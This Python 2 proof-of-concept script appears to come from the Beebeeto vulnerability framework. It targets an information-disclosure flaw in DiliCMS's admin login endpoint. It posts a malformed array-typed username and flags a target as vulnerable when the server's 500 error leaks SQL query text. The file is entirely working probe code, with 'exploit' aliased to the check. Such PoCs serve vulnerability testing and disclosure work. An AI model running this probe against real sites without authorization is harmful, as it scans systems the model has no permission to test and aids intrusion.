#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0058',
            'name': 'DiliCMS /admin/login/do 信息泄漏漏洞 POC',
            'author': 'fate9091',
            'create_date': '2015-03-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Dilicms',
            'vul_version': '*',
            'type': 'Information Disclosure',
            'tag': ['dilicms漏洞', 'dilicms信息泄露漏洞', '/admin/login/do'],
            'desc': '管理后台登录页面',
            'references': ['http://www.beebeeto.com',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        file_path = "/admin/login/do"
        verify_url = args['options']['target'] + file_path
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        test_data = {'username[]':'xx','password':'xx'}
        test_data_urlencode = urllib.urlencode(test_data)
        try:
            req = urllib2.urlopen(verify_url,data=test_data_urlencode)
        except urllib2.HTTPError,e:
            if e.code == 500 and "`username` =  Array</p>" in  e.read():
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
            return args
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())